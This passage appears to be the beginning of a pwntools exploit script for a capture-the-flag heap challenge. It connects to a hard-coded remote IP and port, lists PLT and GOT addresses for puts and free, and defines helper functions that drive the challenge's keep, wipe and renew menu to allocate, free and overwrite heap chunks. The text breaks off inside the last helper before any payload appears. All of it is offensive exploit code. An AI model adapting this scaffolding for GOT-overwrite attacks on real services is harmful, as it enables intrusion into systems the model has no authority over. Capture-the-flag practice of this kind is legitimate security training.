from pwn import*
#p = process('./sf9')
p = remote('35.194.245.237',8089 )
t = 0.05
# gadget
puts_plt = 0x400760
puts_got = 0x602020
free_got = 0x602018
# definition

def keep(select,content):
        p.sendlineafter('3. Renew secret\n','1');sleep(t)
        p.sendline(str(select));sleep(t)
        p.send(content);sleep(t)

def wipe(select):
        p.sendlineafter('3. Renew secret\n','2');sleep(t)
        p.sendline(str(select));sleep(t)

def renew(select,content):
        p.sendlineafter('3. Renew secret\n','3');sleep(t)
        p.sendline(str(select));sleep(t)
        p.send(content);sleep(t
